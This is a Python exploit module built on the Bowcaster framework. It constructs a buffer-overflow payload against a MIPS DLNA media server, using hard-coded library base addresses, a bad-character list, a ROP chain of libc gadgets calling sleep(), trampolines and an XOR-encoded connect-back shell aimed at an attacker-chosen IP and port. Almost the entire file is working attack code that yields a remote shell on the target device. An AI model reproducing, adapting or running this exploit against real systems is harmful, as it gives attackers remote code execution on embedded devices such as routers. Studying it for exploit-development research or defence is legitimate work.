from bowcaster.common.support import Logging
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.encoders.mips import MipsXorEncoder
from bowcaster.common.support import LittleEndian
from bowcaster.development import OverflowBuffer
from bowcaster.development import SectionCreator
from bowcaster.payloads.mips import Trampoline

class DLNA_Overflow(object):
    LIBC_BASE=0x2aedd000
    LIBAVCODEC_BASE=0x2b0a0000
    LIBAVFORMAT_BASE=0x2ad03000
    LIBAVUTIL_BASE=0x2af7b000
    
    BADCHARS=['\x0d','\x00','\x20','\x0a','\x2d','\x3c']
    def __init__(self,length,connectback_ip,port=8080,logger=None):
        cls=self.__class__
        if not logger:
            logger=Logging()
        self.logger=logger
        
        ra=211
        s8=207
        fp=s8
        s7=203
        s6=199
        s5=195
        s4=191
        s3=187
        s2=183
        s1=179
        s0=175
        
        SC=SectionCreator(LittleEndian,badchars=cls.BADCHARS,base_address=cls.LIBC_BASE)

        #This needs to be a pointer that can be dereferenced to another pointer,
        #which can be incremented to a memory location.
        #This is a pointer in the .sdata section that points to itself, and is
        #followed by null bytes and is writable.
        SC.gadget_section(375,0x4A558,
                          description="Placeholder for passed_args[0].  Passed to strcatf() at 0x0041635C.",
                          base_address=cls.LIBAVUTIL_BASE)
         
        #This needs to be any readable memory location.
        #This points to the string "November" in libc's read-only data section.
        SC.gadget_section(151,0x0005367A,
                          description="Placeholder for for 'duration' stack hazard.  Passed to strcatf() in $a2 at 0x00416EFC.",
                          base_address=cls.LIBC_BASE)

         # SC.gadget_section(151,0x126DB0,
         #                   description="Placeholder for for 'duration' stack hazard.  Passed to strcatf() in $a2 at 0x00416EFC.",
         #                   base_address=cls.LIBAVCODEC_BASE)
 #        
 #        SC.gadget_section(159,0x126db4,
 #                          description="Pointer to nul bytes.Placeholder for argument to vsnprintf()",
 #                          base_address=cls.LIBAVCODEC_BASE)

        #Pointer to "November" in libc
        SC.gadget_section(103,0x0005367A,
                          description="Placeholder for 'mime' stack hazard. Passed to strcatf() in $a2 at 0x0041644C",
                          base_address=cls.LIBC_BASE)
        
        #Pointer to "November" in libc
        SC.gadget_section(163,0x0005367A,
                          description="Placeholder from 'detailID stack hazard. Passed to strcatf() in var_110 at 0x41644c",
                          base_address=cls.LIBC_BASE)
        
        SC.gadget_section(391,0x1ca490b,
                          description=("Arbitrary number that gets transformed into a pointer that can be dereferenced.\n"+
                                       "Ultimately Passed to strcatf() in var_118 at 0x41644c"),
                          base_address=0x0)
 
        SC.gadget_section(363,0x07EC80,
                          description="Placeholder for stack hazard.  Pointer to this address passed to strcatf() at 0x415064.",
                          base_address=cls.LIBAVFORMAT_BASE)
 
        SC.gadget_section(367,0xFFF80BE0,
                          description="Placeholder, than when added to the libavformat's .sdata pointer, will result in a pointer into libsqlite's data segment.",
                          base_address=0x0)
        

        # .text:0001D95C                 move    $t9, $s1
        # .text:0001D960                 lw      $ra, 0x28+var_4($sp)
        # .text:0001D964                 lw      $s2, 0x28+var_8($sp)
        # .text:0001D968                 lw      $s1, 0x28+var_C($sp)
        # .text:0001D96C                 lw      $s0, 0x28+var_10($sp)
        # .text:0001D970                 jr      $t9
        # .text:0001D974                 addiu   $sp, 0x28
        SC.gadget_section(ra,0x1D95C,
                           description="[ra] Stage stack data into $ra for return from sleep(), jr $s1.",
                           base_address=cls.LIBC_BASE)
        
        # .text:00043884                 move    $t9, $s0
        # .text:00043888                 li      $a0, 2
        # .text:0004388C                 lw      $s0, 0x20+var_8($sp)
        # .text:00043890                 li      $a1, 1
        # .text:00043894                 move    $a2, $zero
        # .text:00043898                 jr      $t9
        # .text:0004389C                 addiu   $sp, 0x20
        SC.gadget_section(s1,0x43884,
                          description="[s1] Stage 2 sec arg to sleep(), jr $s0")
        
        #new register offsets (As a result
        #of $ra gadget, but before $s1 gadget is loaded by $ra gadget):
        ra=251
        s2=247
        s1=243
        s0=239
        
        #Stage sleep() in $s0
        SC.gadget_section(s0,0x000506C0,
                          description="[s0] Address of sleep().  Next gadget jumps to this address.")
        
        
        SC.gadget_section(s2,0x000506C0,
                          description="[s2] A pointer that can be dereferenced with out crashing the next gadget.")
                          
        # .text:000427A8                 addiu   $s0, $sp, 0xE0+var_C0
        # .text:000427AC                 lw      $a0, 0($s2)
        # .text:000427B0                 move    $a1, $s1
        # .text:000427B4                 move    $a2, $s4
        # .text:000427B8                 move    $t9, $s6
        # .text:000427BC                 jalr    $t9
        # .text:000427C0                 move    $a3, $s0
        SC.gadget_section(ra,0x427A8,
                          description="[ra] Stackfinder. stage 0xE0+var_C0+$sp in $s0, jalr $s6.")
        
        # (Start one instruction early because 3c is a bad byte.)
        # .text:00010938                 la      $t9, free
        # .text:0001093C                 move    $t9, $s0
        # .text:00010940                 jalr    $t9
        # .text:00010944                 move    $a0, $s2
        SC.gadget_section(s6,0x10938,
                          description="[s6] Stackjumper. jalr $s0.")
        
        trampoline_1=Trampoline(LittleEndian,-310)
        SC.string_section(319,trampoline_1.shellcode,
                          description="Trampoline back to beginning of buffer.")
        
        trampoline_2=Trampoline(LittleEndian,1028)
        SC.string_section(11,trampoline_2.shellcode,
                          description="Trampoline forward to trampoline 3.")
        
        #trampoline_3=Trampoline(LittleEndian,-618)
        #SC.string_section(1043,trampoline_3.shellcode,
        #                  description="Trampoline back to payload.")
        
                          
        payload=ConnectbackPayload(connectback_ip,LittleEndian,port=port)
        encoded_payload=MipsXorEncoder(payload,badchars=cls.BADCHARS)
        
        self.logger.LOG_DEBUG("Length of encoded shellcode: %d" % len(encoded_payload.shellcode))

        #offset 427 with  3trampolines. 1043 with only 2 trampolines
        SC.string_section(1043,encoded_payload.shellcode,
                          description="XOR encoded connect-back shell to ip:port %s:%d" % (connectback_ip,port))
        
        
        self.buf=OverflowBuffer(LittleEndian,length,SC.section_list)
        
        